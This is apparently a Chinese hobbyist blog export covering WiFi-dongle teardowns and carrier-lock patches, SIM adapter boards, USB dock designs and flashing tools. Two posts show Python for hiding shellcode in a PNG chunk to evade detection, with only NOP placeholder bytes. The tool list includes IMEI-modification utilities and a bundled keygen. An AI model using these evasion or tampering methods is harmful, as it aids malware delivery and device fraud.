后台\n\n![image-20230503153610868](https://img14.360buyimg.com/ddimg/jfs/t1/65147/28/22379/65096/64520f71Fb27181cc/0e09c5dc5a8c863d.jpg)\n\n![image-20230503153854618](https://img14.360buyimg.com/ddimg/jfs/t1/219741/22/29065/18680/64520f8eFa5fe28bd/bce1bd741090fda8.jpg)\n\n**支持WIFI6 是一大亮点 ZTE标准后台没啥好说的**\n\n{% note success no-icon %}\n\n**切卡密码: BJadmin1234**\n\n{% endnote %}\n\n----\n\n## 拆解\n\n![image-20230503162612893](https://img14.360buyimg.com/ddimg/jfs/t1/188089/10/35022/59429/64521aa5F29a273cb/11d83de1765501a6.jpg)\n\n![image-20230503162636474](https://img14.360buyimg.com/ddimg/jfs/t1/183114/8/34641/80772/64521abcF9ac3a2ed/d406588a10f5d7cb.jpg)\n\n![image-20230503162652190](https://img14.360buyimg.com/ddimg/jfs/t1/135964/17/37018/75218/64521accF50ad09de/dad19269efc85b59.jpg)\n\n- **采用18650电池 容量为2500mAh 电源方案采用IP5306 MicroUSB接口 (为什么不是TypeC!!!!)**\n\n- **主控采用ZX297520 更换外围WIFI芯片为2.4G `WIFI6` 与供电板采用USB连接**\n\n- **美中不足 MicroUSB接口 非常..小尺寸的天线**\n\n## 固件\n\n**![image-20230503163342015](https://img14.360buyimg.com/ddimg/jfs/t1/157230/19/33748/128497/64521c66Fdeea59e9/9f1f782971ee2b70.jpg)**\n\n- **与常规ZTE固件一致 多出2个加密分区 有待进一步探索**\n\n## 云控\n\n{% note success  no-icon %}\n\n**使用须知**\n\n- 1.使用MicroUSB数据线接入电脑\n\n- 2.等待开机后 电脑拿到IP 能进入web\n- 3.打开软件 一键完成\n- 4.出现**Already Exists** 证明已经补丁过了\n- 5.出现**Reboot**补丁完成 可以关闭了\n- 6.非永久性补丁 请勿重置系统\n\n{% endnote %}\n\n----\n\n![image-20230503163531047](https://img14.360buyimg.com/ddimg/jfs/t1/223879/17/21367/28102/64521cd2F0a45c102/958d43062322a0d0.jpg)\n\n{% note danger %}\n\n**仅适用于口红WiFi6固件系统使用!**\n\n{% endnote %}\n\n{% note info no-icon %}\n\n**已修改切卡为无密码模式**\n**~~下载地址: https://www.123pan.com/s/mh49-1TBwv 提取码:0721~~**\n\n**请移步 `中兴微 R1869系列补丁`这个帖子**\n\n{% endnote %}\n\n","tags":["随身WIFI"]},{"title":"小飞碟随身WIFI","url":"/shizuku/050110.html","content":"\n# 云小陌 小飞碟 随身WiFi\n\n## 开箱\n\n![1682846784371](https://img14.360buyimg.com/ddimg/jfs/t1/202173/4/33299/78801/644f7053Fee468cbd/052286c4e883e965.jpg)\n\n![1682927862903](https://img14.360buyimg.com/ddimg/jfs/t1/107707/20/37932/112579/644f7101F9f1eb1c2/188466e3d68283bb.jpg)\n\n**外盒采用木盒包装..有一说一这是我买过随身WiFi里面包装最好的**\n\n![1682846797802](https://img14.360buyimg.com/ddimg/jfs/t1/101073/37/27700/102654/644f716cF2e883afe/f8a1af555358c2e2.jpg)\n\n**本体圆形 赠送一根数据线 一本说明书 颜色有黑/白 双色**\n\n----\n\n## 拆解\n\n![1682846805554](https://img14.360buyimg.com/ddimg/jfs/t1/204541/19/33918/147918/644f7acdFde9e3099/3a45c91182253d8d.jpg)\n\n\n![image.png](https://img12.360buyimg.com/ddimg/jfs/t1/117346/14/35747/29817/6451e667F53455a23/b463ec18fc660fca.jpg)\n\n![image.png](https://img11.360buyimg.com/ddimg/jfs/t1/112588/26/33866/34311/6451e67aFa376ad60/86361d55776ed170.jpg)\n\n{% note info no-icon %}\n\n**SOC: ZX297520**\n**Flash: 25QU64(8M)**\n\n{% endnote %}\n\n**TypeC数据/供电 三天线设计 支持分集天线 贴片卡为电信物联 卡槽为移动物联卡**\n\n----\n\n## 后台\n\n![image.png](https://img12.360buyimg.com/ddimg/jfs/t1/118911/4/35706/44447/6451e441Fb799625b/baaf5e566ba105e3.jpg)\n\n![image.png](https://img11.360buyimg.com/ddimg/jfs/t1/66707/21/25045/21573/6451e471F0ea893be/2d5fc57f08341841.jpg)\n\n![image.png](https://img13.360buyimg.com/ddimg/jfs/t1/223694/18/19722/4009/6451e48aF44b3da76/4f6ab5650644bb09.jpg)\n\n**支持直接切卡 频段支持1358和WCDMA 不支持CDMA 支持联通 移动短信收发**\n\n----\n\n## 串口\n\n{% note warning no-icon %}\n\n板子背部有` T0_RX T0_TX T1_RX T1_TX` 使用1.8V TTL分别接入 \n\nT0无输出 T1存在加密输出\n\n\n{% endnote %}\n\n![2f9b6f91fb3f81ae.jpg](https://img12.360buyimg.com/ddimg/jfs/t1/116564/10/35388/160064/6451f1f7F0bbcf376/a367ddf8c9309074.jpg)\n\n----\n\n## 固件\n\n**使用Binwalk分析固件**\n\n![image-20230503133739819](https://img14.360buyimg.com/ddimg/jfs/t1/154537/29/23039/97010/6451f323F0e61ff62/6aac55278ef9e194.jpg)\n\n**Squashfs文件系统位于偏移量`0x4A8000`**\n\n{% note info no-icon %}\n\n**读取 解包 打包 篇幅原因 详见下篇文章**\n\n{% endnote %}\n\n{% note success no-icon %}\n\nADB固件下载: **https://www.123pan.com/s/mh49-qjawv**\n特点: 开启ADB 移除云控 开启高级后台\n\n{% endnote %}\n\n----\n\n## 云控\n\n### 设备补丁\n\n{% note success  no-icon %}\n\n**使用须知**\n\n- 1.拔掉插入的电话卡\n-  2.等待开机后 电脑拿到IP 能进入web\n-  3.打开软件 一键完成\n-  4.出现**Already Exists** 证明已经补丁过了\n-  5.出现**Reboot**补丁完成 可以关闭了\n-  6.非永久性补丁 请勿重置系统\n\n ~~下载地址: https://www.123pan.com/s/mh49-ijawv~~\n\n**请移步 `中兴微 R1869系列补丁`这个帖子**\n\n\n{% endnote %}\n\n{% note danger no-icon %}\n\n**以上补丁适用于全新设备第一次使用**\n\n{% endnote %}\n\n![image-20230503143853867](https://img14.360buyimg.com/ddimg/jfs/t1/185167/18/31755/8607/6452017dF3fd18839/b1d3cc77d473d2cd.jpg)\n\n----\n\n### 断网解除\n\n**如果你的设备在没有补丁的情况下插卡 导致设备开机红灯 无法联网 请使用这个补丁**\n\n{% note info no-icon %}\n\n- **1. 插入自己`有流量`的电话卡! 并切卡到卡槽**\n- **2. 等待开机后 电脑拿到IP 能进入web**\n- **3. 关闭电脑防火墙**\n- **4. 打开软件 一键完成**\n- **5. 非永久性补丁 请勿重置系统**\n\n~~**下载地址**: https://www.123pan.com/s/mh49-Ljawv~~\n\n**请移步 `中兴微 R1869系列补丁`这个帖子**\n\n\n{% endnote %}\n\n![image-20230503144431320](https://img14.360buyimg.com/ddimg/jfs/t1/168555/30/34156/10500/645202ceFc80ae825/9e23187087230609.jpg)\n\n----\n\n## 结束\n\n{% note warning  %}\n\n**软解补丁 请勿恢复出厂 补丁一次即可**\n**程序无毒 支持 `x86 x64 ARMx64` 架构的Win系统**\n**WD误杀属正常现象 请放心使用~**\n**程序仅适用于小飞碟 请勿用于其他ZTE设备**\n\n{% endnote %}\n","tags":["随身WIFI"]},{"title":"SIM卡转接板","url":"/shizuku/040740.html","content":"\n![](https://kjimg10.360buyimg.com/ott/jfs/t20250420/166036/4/23441/68161/644177c1F452f29db/dbe8fc3843ca252d.png)\n\n# SIM卡的各类转接板\n\n{% note danger  %}\n\n## **打板请使用 0.8mm 厚度**! 并选择指定位置客编 !!!\n\n\n{% endnote %}\n\n## eSIM转SIM\n\n![image-20230421001432479](https://kjimg10.360buyimg.com/ott/jfs/t20250420/115006/16/35291/8149/6441652aF6fc7f309/29c5f1f8685a88fc.png)\n\n{% note info no-icon %}\n\n**Gerber下载地址: https://www.123pan.com/s/mh49-Eqawv**\n\n{% endnote %}\n\n-----\n\n## nanoSIM(翻盖)转SIM\n\n![image-20230421013953231](https://kjimg10.360buyimg.com/ott/jfs/t20250420/80000/7/20601/31576/644178f0Fcc9cfd5f/96594357819ee428.png)\n\n{% note info no-icon %}\n\n**Gerber下载地址: https://www.123pan.com/s/mh49-mqawv**\n\n{% endnote %}\n\n----\n\n## nanoSIM(自弹)转SIM\n\n![](https://kjimg10.360buyimg.com/ott/jfs/t20250420/158077/12/34198/29962/64417a8dFb364cf9f/67bc7fce41357fd5.png)\n\n{% note info no-icon %}\n\n**Gerber下载地址: https://www.123pan.com/s/mh49-1qawv**\n\n{% endnote %}\n\n-----\n\n## nanoSIM(2in1)转SIM\n\n![image-20230421015341551](https://kjimg10.360buyimg.com/ott/jfs/t20250420/43865/3/22404/12069/64417c2aFc641443a/dd14ab1ea8cd2d28.png)\n\n{% note warning no-icon %}\n\n**兼容翻盖/自弹卡槽 未经打样测试 请自测**\n**Gerber下载地址: https://www.123pan.com/s/mh49-4qawv 提取码: 2in1**\n\n\n{% endnote %}\n\n----\n\n## nanoSIM转SIM (拼板)\n\n{% note success no-icon %}\n\n**单次打样为5份 一板10张 合计50卡槽 切莫滥用 ~~小心被嘉立创撅了(逃...~~**\n\n\n{% endnote %}\n\n![image-20230421020018401](https://kjimg10.360buyimg.com/ott/jfs/t20250420/102942/25/35754/38790/64417dbcFae36adba/cd9db4b63388cddf.png)\n\n![image-20230421020118966](https://kjimg10.360buyimg.com/ott/jfs/t20250420/129994/11/31622/23397/64417df4F7c65e3f4/16390374022b4549.png)\n\n{% note info no-icon %}\n\n**Gerber下载地址: https://www.123pan.com/s/mh49-xqawv 提取码: 0721**\n\n\n{% endnote %}\n\n----\n\n{% note success %}\n## 立创开源\n\n**https://oshwhub.com/Zy143L/esim-sim**\n{% endnote %}\n\n----","tags":["随身WIFI","SIM卡"]},{"title":"图片提取ShellCode","url":"/shizuku/031001.html","content":"\n# 从PNG图片中分离ShellCode\n\n{% note info no-icon %}\n\n使用Python的`struct`库从图片中分离出ShellCode\n\n{% endnote %}\n\n```python\nimport struct\n\n\nwith open('modified_image.png', 'rb') as f:\n    img_data = f.read()\n\n# 查找并提取PNG元数据中的shellcode\npos = 33\nwhile pos < len(img_data):\n    chunk_len, chunk_type = struct.unpack('>I4s', img_data[pos:pos + 8])\n    if chunk_type == b'shel':\n        shellcode = img_data[pos + 8:pos + 8 + chunk_len]\n        break\n    pos += 12 + chunk_len\nelse:\n    raise ValueError('图片不存在Shellcode')\n\nprint(shellcode)\n```\n\n","tags":["ShellCode","Bypass"]},{"title":"图片写入ShellCode","url":"/shizuku/034424.html","content":"\n# 将Shellcode写到PNG图片\n\n{% note success no-icon %}\n\n**使用Python将Shellcode写入图片中实现Bypass 且不损坏原始图片内容**\n\n\n{% endnote %}\n\n## 1. 读取PNG图像数据\n\n读取PNG图像数据。使用Python内置的`open()`函数打开图像文件，使用`rb`模式以二进制格式读取文件内容，并将读取到的数据存储在变量`img_data`中。\n\n```python\nwith open('demo.png', 'rb') as f:\n    img_data = f.read()\n```\n\n## 2. 创建shellcode\n\n要插入的shellcode。这里暂时使用\\x90。在实际应用中，需要根据实际情况插入具体的shellcode。\n\n```python\nshellcode = b'\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90'\n```\n\n## 3. 创建PNG数据块\n\n需要创建一个PNG数据块，并将shellcode插入到其中。PNG数据块结构为：长度（4个字节）+类型（4个字节）+数据（长度字节）+CRC校验（4个字节）。其中，CRC校验用于保证数据的完整性。使用Python内置的`struct`模块和`zlib`模块，分别用于将数据打包成二进制格式和计算CRC校验。\n\n```python\nchunk_type = b'shel'\nchunk_data = shellcode\nchunk_crc = struct.pack('!I', 0xffffffff & (0xffffffff ^ zlib.crc32(chunk_type + chunk_data)))\n\nchunk_len = struct.pack('!I', len(chunk_data))\nchunk = chunk_len + chunk_type + chunk_data + chunk_crc\nimg_data = img_data[:33] + chunk + img_data[33:]\n```\n\n## 4. 保存修改后的图像\n\n最后，使用Python内置的`open()`函数打开文件，使用`wb`模式以二进制格式写入文件内容，并将修改后的PNG图像数据存储在文件中。\n\n```python\nwith open('modified_image.png', 'wb') as f:\n    f.write(img_data)\n```\n\n## 5. 完整代码\n\n```python\nimport struct\nimport zlib\n\nwith open('demo.png', 'rb') as f:\n    img_data = f.read()\n\nshellcode = b'\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90'\n\nchunk_type = b'shel'\nchunk_data = shellcode\nchunk_crc = struct.pack('!I', 0xffffffff & (0xffffffff ^ zlib.crc32(chunk_type + chunk_data)))\n\nchunk_len = struct.pack('!I', len(chunk_data))\nchunk = chunk_len + chunk_type + chunk_data + chunk_crc\n\nimg_data = img_data[:33] + chunk + img_data[33:]\n\nwith open('modified_image.png', 'wb') as f:\n    f.write(img_data)\n```\n\n{% note danger %}\n\n**请注意写入Shellcode的图片不可使用压缩编辑软件 以及会压缩图片的图床 会导致内容丢失**\n\n\n{% endnote %}\n","tags":["ShellCode","Bypass"]},{"title":"UFI拓展坞 Pro版本","url":"/shizuku/020600.html","content":"\n# 随身WiFi的USB拓展坞 Pro版本\n\n## 产品功能\n\n**针对随身WiFi刷入Debian固件后拓展性不足的解决方案**\n\n**PCB针对随身WiFi结构进行设计 使用TypeC接口 支持双模式USB/UFI**\n\n**增加百兆网口 RTL8152B 增加TF读卡功能 GL823K**\n\n{% note success no-icon %}\n\n**产品规格在10*10cm规格内 可使用嘉立创免费打样**\n\n{% endnote %}\n\n{% note danger no-icon %}\n\n**拨码器模式 1100对应UFI模式 0011对应USB模式**\n\n**请勿拨至1111/0000 请勿带电切换**\n\n**UFI模式: USB数据给背面USB用于随身WIFI**\n\n**USB模式: USB数据给正面TypeC接口 用于电脑拓展屋**\n\n**请使用5V 2A以上品牌充电头供电**\n\n\n{% endnote %}\n\n----\n\n## 开源地址\n\n{% note info no-icon %}\n\n **https://oshwhub.com/zy143l/ufi_hub_rj45_share**\n\n**与本博客规格略有出入 博客为最新版本**\n\n{% endnote %}\n\n----\n\n## 物料清单\n\n| **物料**      | 规格        | **数量** | **备注**                       |\n| ------------- | ----------- | -------- | ------------------------------ |\n| **SL2.1A**    | **SOP16**   | **1**    | **注意正方向**                 |\n| **GL823K**    | **SOP16**   | **1**    | **针脚密集 注意焊接**          |\n| **RTL8152B**  | **QFN24**   | **1**    | **注意方向 QFN封装**           |\n| **HR911105A** | **911105A** | **1**    | **RJ45网口 集成网变 带灯**     |\n| **KE 1.27**   | **4P**      | **1**    | **1.27mm 4P贴片拨码开关**      |\n| **TF卡槽**    | **9P**      | **1**    | **贴片 TF卡卡槽 外焊**         |\n| **PPTC**      | **1206**    | **1**    | **6V 2A 1206贴片自恢复保险丝** |\n| **USB母座**   | **6.3mm**   | **2**    | **6.3mm 全贴 短体**            |\n| **USB母座**   | **6.8mm**   | **1**    | **6.8mm 后插后贴 短体**        |\n| **TypeC**     | **16P**     | **1**    | **16P直插TypeC母座**           |\n| **5.1KΩ**     | **0603**    | **2**    | **用于TypeC CC识别 选装**      |\n| **10KΩ**      | **0603**    | **4**    | **下拉电阻**                   |\n| **470Ω**      | **0603**    | **2**    | **网口灯电阻**                 |\n| **2.49KΩ**    | **0603**    | **1**    | **网卡复位电阻**               |\n| **0Ω**        | **0603**    | **1**    | **消除噪声 隔离接地**          |\n| **10uF**      | **0603**    | **8**    | **滤波储能 消除噪声**          |\n| **1uF**       | **0603**    | **5**    | **滤波储能 消除噪声**          |\n| **4.7uF**     | **0603**    | **1**    | **滤波储能 消除噪声**          |\n| **100nF**     | **0603**    | **12**   | **去耦电容 消除噪声**          |\n| **22pF**      | **0603**    | **2**    | **晶振电容**                   |\n| **LED蓝色**   | **0603**    | **1**    | **通电指示灯 颜色随意**        |\n| **12Mhz**     | **3225**    | **1**    | **贴片晶振 无源**              |\n| **25Mhz**     | **3225**    | **1**    | **贴片晶振 无源**              |\n| **风扇插头**  | **XH2.54**  | **1**    | **弯脚直插 用于风扇接入**      |\n| **立柱**      | **M.3**     | **4**    | **四周立柱 M.3规格开孔**       |\n\n----\n\n## 使用须知\n\n{% note success no-icon %}\n\n**请参考 WiKi https://www.kancloud.cn/handsomehacker/openstick/2637561**\n\n**使用 `echo host > /sys/kernel/debug/usb/ci_hdrc.0/role`开启USB Host模式**\n\n{% endnote %}\n\n\n\n----\n\n## 效果预览\n\n![image-20230209035803114](https://kjimg10.360buyimg.com/ott/jfs/t1/39250/11/16668/71915/63e3fecfF35961a51/43076f805a505787.png)\n\n![image-20230209035827746](https://kjimg10.360buyimg.com/ott/jfs/t1/200924/22/25619/53592/63e3fee7F5d9bd4b0/967c101d86583f64.png)\n\n## 文件下载\n\n{% note info no-icon %}\n\n**Gerber文件: https://www.123pan.com/s/mh49-7Wawv**\n\n**工程文件: https://www.123pan.com/s/mh49-bWawv**\n\n{% endnote %}\n\n","tags":["随身WIFI"]},{"title":"UFI拓展坞 V2.0版本","url":"/shizuku/024433.html","content":"\n# 随身WiFi的USB拓展坞 V2.0版本\n\n## 产品功能\n\n**针对随身WiFi刷入Debian固件后拓展性不足的解决方案**\n\n**PCB针对随身WiFi结构进行设计**\n\n**使用TypeC供电 支持XH2.54供电 使用MOS控制XH2.54 配合GPIO可实现温控启停**\n\n**USB数据线差分等长走线 晶振过孔包地屏蔽**\n\n{% note success no-icon %}\n\n**产品规格在10*10cm规格内 可使用嘉立创免费打样**\n\n**如遇到收取锣槽费用 请联系客服并表示为立创开源平台项目**\n\n{% endnote %}\n\n{% note danger no-icon %}\n\n**TypeC为纯供电接口 不具备数据功能**\n\n**请使用5V 2A以上品牌充电头供电**\n\n\n{% endnote %}\n\n----\n\n## 开源地址\n\n{% note info no-icon %}\n\n1.0版本 **https://oshwhub.com/zy143l/ufi_hub_lite_share**\n\n{% endnote %}\n\n----\n\n## 物料清单\n\n| **物料**     | 规格       | **数量** | **备注**                  |\n| ------------ | ---------- | -------- | ------------------------- |\n| **SL2.1A**   | **SOP16**  | **1**    | **注意正方向**            |\n| **USB母座**  | **6.8mm**  | **5**    | **6.8mm 后贴后插**        |\n| **TypeC**    | **6P**     | **1**    | **6P直插TypeC母座**       |\n| **5.1KΩ**    | **0603**   | **2**    | **用于TypeC CC识别 选装** |\n| **10KΩ**     | **0603**   | **1**    | **下拉电阻**              |\n| **0Ω/磁珠**  | **0603**   | **1**    | **消除噪声 隔离接地**     |\n| **10uF**     | **0603**   | **6**    | **用于滤波储能**          |\n| **100nF**    | **0603**   | **2**    | **去耦电容 消除噪声**     |\n| **12Mhz**    | **3225**   | **1**    | **贴片晶振 无源**         |\n| **MOS管**    | **CJ2310** | **1**    | **CJ2310 N沟道 长电科技** |\n| **风扇插头** | **XH2.54** | **1**    | **弯脚直插 用于风扇接入** |\n| **立柱**     | **M.2**    | **4**    | **四周立柱 M.2规格开孔**  |\n\n----\n\n## 使用须知\n\n{% note success no-icon %}\n\n**请参考 WiKi https://www.kancloud.cn/handsomehacker/openstick/2637561**\n\n**使用 `echo host > /sys/kernel/debug/usb/ci_hdrc.0/role`开启USB Host模式**\n\n{% endnote %}\n\n![image-20230209034348928](https://kjimg10.360buyimg.com/ott/jfs/t1/180000/34/33247/22087/63e3fb76F162bd5f1/38c0940d2efd7747.png)\n\n----\n\n## 效果预览\n\n![正面](https://kjimg10.360buyimg.com/ott/jfs/t1/116419/34/31261/17036/63e3fa29Fd97dac61/c0a08050f3ca3877.png)\n\n![背面](https://kjimg10.360buyimg.com/ott/jfs/t1/156967/17/34532/9814/63e3fa5bF57fd17b6/b9415186e40cf8b7.png)\n\n![image-20230209034249289](https://kjimg10.360buyimg.com/ott/jfs/t1/52306/36/22896/40556/63e3fb3bFc0792a3b/8e3b6ec4c7ae9df2.png)\n\n**应要求补一个说明图...**\n\n![image-20230513121722355](https://img14.360buyimg.com/ddimg/jfs/t1/6667/18/19033/75680/645f0f59F675b37a9/174550a120e6971d.jpg)\n\n## 文件下载\n\n{% note info no-icon %}\n\n**Gerber文件: https://www.123pan.com/s/mh49-SWawv**\n\n**工程文件: https://www.123pan.com/s/mh49-lWawv**\n\n{% endnote %}\n","tags":["随身WIFI"]},{"title":"UFI拓展坞","url":"/shizuku/084639.html","content":"\n# 随身WiFi的USB拓展坞\n\n## 产品功能\n\n**针对随身WiFi刷入Debian固件后拓展性不足的解决方案**\n\n**PCB针对随身WiFi结构进行设计**\n\n**使用TypeC供电 支持XH2.54供电 增加开关功能**\n\n**USB数据线差分等长走线 晶振过孔包地屏蔽**\n\n{% note success no-icon %}\n\n**产品规格在10*10cm规格内 可使用嘉立创免费打样**\n\n**如遇到收取锣槽费用 请联系客服并表示为立创开源平台项目**\n\n{% endnote %}\n\n{% note danger no-icon %}\n\n**TypeC为纯供电接口 不具备数据功能**\n\n**请使用5V 2A以上品牌充电头供电**\n\n\n{% endnote %}\n\n----\n\n## 开源地址\n\n{% note info no-icon %}\n\n**https://oshwhub.com/zy143l/ufi_hub_lite_share**\n\n{% endnote %}\n\n----\n\n## 物料清单\n\n| **物料**     | 规格        | **数量** | **备注**                     |\n| ------------ | ----------- | -------- | ---------------------------- |\n| **SL2.1A**   | **SOP16**   | **1**    | **注意正方向**               |\n| **USB母座**  | **6.8mm**   | **5**    | **6.8mm 后贴后插**           |\n| **TypeC**    | **6P**      | **1**    | **6P直插TypeC母座**          |\n| **5.1KΩ**    | **0603**    | **2**    | **用于TypeC CC识别 可不装**  |\n| **0Ω/磁珠**  | **0603**    | **1**    | **消除噪声 隔离接地**        |\n| **10uF**     | **0603**    | **6**    | **用于滤波储能**             |\n| **100nF**    | **0603**    | **2**    | **去耦电容 消除噪声**        |\n| **12Mhz**    | **3225**    | **1**    | **贴片晶振 无源**            |\n| **拨动开关** | **MK12C02** | **1**    | **MK12C02/MK12C01 规格相同** |\n| **风扇插头** | **XH2.54**  | **1**    | **弯脚直插 用于风扇接入**    |\n| **立柱**     | **M.2**     | **4**    | **四周立柱 M.2规格开孔**     |\n\n----\n\n## 使用须知\n\n{% note success no-icon %}\n\n**请参考 WiKi https://www.kancloud.cn/handsomehacker/openstick/2637561**\n\n**使用 `echo host > /sys/kernel/debug/usb/ci_hdrc.0/role`开启USB Host模式**\n\n{% endnote %}\n\n----\n\n## 产品图片\n\n![image-20220812015042240](https://m.360buyimg.com/babel/jfs/t1/96081/29/30415/52689/62f54175E93f1879d/8847e1ef611f1653.png)**\n\n**![](https://m.360buyimg.com/babel/jfs/t1/14355/24/17570/50749/62f54114E9cf7d0c6/6b07622276adc7d5.png)**\n\n**![image-20220812015402546](https://m.360buyimg.com/babel/jfs/t1/30736/31/17249/23996/62f5423dE229a83e1/64022abaa3fb470d.png)**\n\n**![image-20220812015514405](https://m.360buyimg.com/babel/jfs/t1/162244/33/29699/165159/62f5428aEd0aeb39e/fd34fb120671dad7.png)**\n\n----\n","tags":["随身WIFI"]},{"title":"设备刷机需要的软件","url":"/shizuku/083803.html","content":"\n# 刷机与制作需要的软件\n\n{% note success no-icon %}\n\n**电脑用户请参考侧面导航快速定位或借助Ctrl-F搜索**\n\n**手机用户请点击右下方的目录按钮进行快速阅览**\n\n\n{% endnote %}\n\n## miko service tool\n\n**安装后 替换 loder.exe 文件作为主程序 请自行替换桌面快捷方式**\n\n![](https://m.360buyimg.com/babel/jfs/t1/138345/11/28478/30158/62f528feE83b3b321/d428dbf1b8465f80.png)\n\n![](https://m.360buyimg.com/babel/jfs/t1/34/25/17993/31373/62f529a9Efa801769/d52ac55fd549889f.png)\n\n### 功能\n\n**在9008模式下 进行刷入与读取 支持eMMC全分区备份**\n\n**拿到UFI的第一件事就是备份eMMC全备份**\n\n**自带大量引导文件 自动识别端口**\n\n{% note danger %}\n\n**其中的小米华为三星功能模块 请勿使用 !** \n\n{% endnote %}\n\n### 下载地址\n\n{% note info no-icon %}\n\n https://www.123pan.com/s/mh49-qyfwv 提取码:**miko**\n\n\n{% endnote %}\n\n----\n\n## Qualcomm Premium Tool\n\n![](https://m.360buyimg.com/babel/jfs/t1/132309/6/30209/53337/62f52eafE890d980a/d5000b6f08f9da39.png)\n\n### 功能\n\n**自带firehose引导 自动重启端口 支持单分区的擦写读**\n\n**安装后需要激活 安装包内自带注册机**\n\n{% note danger no-icon %}\n\n请勿点击 **9008 to 9006** 选项\n\n\n{% endnote %}\n\n### 下载地址\n\n{% note info no-icon %}\n\nhttps://www.123pan.com/s/mh49-6yfwv 提取码: **qpts**\n\n\n{% endnote %}\n\n----\n\n## QualTek Tool\n\n![](https://m.360buyimg.com/babel/jfs/t1/39278/20/18098/41280/62f52ffcE6dd02e1f/f981e1187e72378d.png)\n\n### 功能\n\n**支持分区读取与擦写 写分区需要 rawprogram0.xml 文件**\n\n**不能自动识别平台 需要手动选择Loader文件**\n\n### 下载地址\n\n{% note info no-icon %}\n\nhttps://www.123pan.com/s/mh49-yyfwv 提取码: **qual**\n\n\n{% endnote %}\n\n----\n\n## 星海工具\n\n![](https://m.360buyimg.com/babel/jfs/t1/167317/29/26550/29707/62f530beEa3c613fa/c76b4b33584c997b.png)\n\n### 功能\n\n**修改IMEI MEID 强开9091端口 备份QCN 刷入QCN**\n\n{% note warning no-icon %}\n\n**其他功能因程序适配问题 请勿随意对手机尝试使用 !**\n\n\n{% endnote %}\n\n### 下载地址\n\n{% note info no-icon %}\n\nhttps://www.123pan.com/s/mh49-Vyfwv 提取码: **svip**\n\n\n{% endnote %}\n\n-----\n\n## 高通串号工具\n\n![](https://m.360buyimg.com/babel/jfs/t1/51843/30/20825/7064/62f53199Eb7c0f02b/701ff94aa33fa2e3.png)\n\n![](https://m.360buyimg.com/babel/jfs/t1/209049/26/25335/7665/62f53250E7ae2336e/ccbf81417690a26d.png)\n\n### 功能\n\n**支持对高通平台设备修改SN MEID IMEI WIFI BT 识别码**\n\n**缺点: 需要手动开启9091端口 建议配合星海工具**\n\n{% note danger no-icon %}\n\n**请勿在新手机上使用此工具 会导致校验失败导致不开机**\n\n{% endnote %}\n\n### 下载地址\n\n{% note info no-icon %}\n\nhttps://www.123pan.com/s/mh49-IVfwv\n\n\n{% endnote %}\n\n----\n\n## AndroidCarrierClassTools\n\n![](https://m.360buyimg.com/babel/jfs/t1/77822/26/20996/32514/62f5330aE38a2ce44/040a901b5b4258ab.png)\n\n### 功能\n\n**非常强大的ROM解包打包移植工具 也叫航母工具**\n\n**适合用于解包Boot移植System等**\n\n**支持ext4任意分区解包提取 功能多多**\n\n### 下载地址\n\n{% note info no-icon %}\n\nhttps://www.123pan.com/s/mh49-jyfwv 提取码: **acct**\n\n\n{% endnote %}\n\n----\n\n## Microsoft VC运行库 / .NET运行库\n\n![](https://m.360buyimg.com/babel/jfs/t1/38332/5/20185/36793/62f533d7E71a59915/3773f84af5ed947d.png)\n\n![](https://m.360buyimg.com/babel/jfs/t1/109068/24/30746/27520/62f53401Ed098ca95/3f7dbddd73253bd2.png)\n\n### 功能\n\n**补全电脑缺失的运行库环境 很多程序依赖这些运行库 例如星海或者Miko**\n\n**没有运行库软件会爆异常 请务必安装**\n\n### 下载地址\n\n{% note info no-icon %}\n\nhttps://www.123pan.com/s/mh49-TVfwv\n\n{% endnote %}\n\n----\n\n## ADB_BootLoder 一键环境/驱动\n\n![](https://m.360buyimg.com/babel/jfs/t1/83749/11/21274/10134/62f5348dEbc300589/c24f83254282f9ae.png)\n\n**来源于安智论坛 版本虽老 但是非常好用 Win10/11 测试一切正常**\n\n### 功能\n\n**15秒安装ADB_FastBoot环境与驱动 刷机必备**\n\n### 下载地址\n\n{% note info no-icon %}\n\nhttps://www.123pan.com/s/mh49-vVfwv\n\n{% endnote %}\n\n----\n\n## MiFlash 单文件 x86/x64 版本\n\n![](https://m.360buyimg.com/babel/jfs/t1/161001/29/29476/9493/62f53555Ede220163/a8a43d1342c220ab.png)\n\n![](https://m.360buyimg.com/babel/jfs/t1/216599/15/20731/8761/62f5356eE1e1a30cf/36e60c5a0ea8e244.png)\n\n**单文件版本 32位与64位双版本**\n\n### 功能\n\n**MiFlash 刷机神器 支持FASTBOOT模式与9008模式快速刷机**\n\n**老版本支持旧系统 新版本对旧系统兼容性不佳 单文件版本方便使用**\n\n**9008模式下 下方功能无任何作用**\n\n### 下载地址\n\n{% note info no-icon %}\n\nhttps://www.123pan.com/s/mh49-dVfwv\n\n{% endnote %}\n\n----\n\n## MiFlash 2018版本\n\n![](https://m.360buyimg.com/babel/jfs/t1/168461/27/29519/12711/62f53662E3cba3437/d0453b0556c081cf.png)\n\n### 功能\n\n****\n\n**MiFlash 刷机神器 支持FASTBOOT模式与9008模式快速刷机**\n\n**2018版本支持新一些的系统刷机 无需登录小米账号 自带驱动安装**\n\n**9008模式刷机导入会提示 `couldn't find flash script.`无需理会**\n\n### 下载地址\n\n{% note info no-icon %}\n\nhttps://www.123pan.com/s/mh49-3Vfwv 提取码: **2018**\n\n{% endnote %}\n\n----\n\n## SPRD IMEI修改工具\n\n![](https://m.360buyimg.com/babel/jfs/t1/55450/5/19427/15871/62f5375eE409d6128/a21673ce5b02f498.png)\n\n### 功能\n\n**展讯紫光芯片修改IMEI工具 需要开启设备的DIAG端口**\n\n**需要自行选择DIAG端口号**\n\n{% note danger no-icon %}\n\n**搜狗输入法不兼容 点击设置闪退请切换输入法**\n\n\n{% endnote %}\n\n### 下载地址\n\n{% note info no-icon %}\n\nhttps://www.123pan.com/s/mh49-hVfwv\n\n{% endnote %}\n\n----\n\n## 展讯紫光驱动\n\n![](https://m.360buyimg.com/babel/jfs/t1/121121/1/25408/13151/62f538faEfe07a109/82e773d178f5234f.png)\n\n### 功能\n\n**包含32与64位双版本 SPRD设备必备驱动**\n\n### 下载地址\n\n{% note info no-icon %}\n\nhttps://www.123pan.com/s/mh49-HVfwv\n\n\n{% endnote %}\n\n----\n\n## 随身WiFi助手\n\n![](https://m.360buyimg.com/babel/jfs/t1/141304/24/28061/20261/62f53a3cEa3f34e7a/ab1a30ed4d1da3c6.png)\n\n### 功能\n\n**功能太多了..自己看图吧 入门必备 一键操作**\n\n### 下载地址\n\n{% note info no-icon 